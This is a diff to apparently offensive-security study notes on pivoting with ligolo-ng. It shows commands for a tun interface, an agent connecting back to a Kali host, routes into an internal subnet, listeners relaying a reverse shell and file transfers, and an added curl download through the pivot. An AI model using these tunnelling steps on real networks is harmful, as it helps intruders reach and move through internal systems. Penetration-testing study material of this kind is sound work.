@@ -111,7 +111,7 @@ kali: sudo ip tuntap add user kali mode tun ligolo
 kali: sudo ip link set ligolo up
 kali: ./proxy -selfcert
 First Agent:
-ms01: agent.exe -connect kali_ip:11601 -ignore-cert
+agent1: agent.exe -connect kali_ip:11601 -ignore-cert
 kali: session
 kali: 1
 kali: ifconfig
@@ -119,9 +119,10 @@ kali: sudo ip route add 172.16.0.0/16(second interface) dev ligolo
 kali: session;1
 kali: start
 kali: listener_list
-kali: listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444(reverse shell)
+kali: listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:4444(reverse shell)
 kali: listener_list
-kali: listener_add --addr 0.0.0.0:1235 --to 127.0.0.1:80(file transfer)
+kali: listener_add --addr 0.0.0.0:1235 --to 0.0.0.0:80(file transfer)
+172.16.5.35: curl http://172.16.5.15:1235/file -o file
 ```
 ### Windows Port forwarding
 ###### PLINK.exe
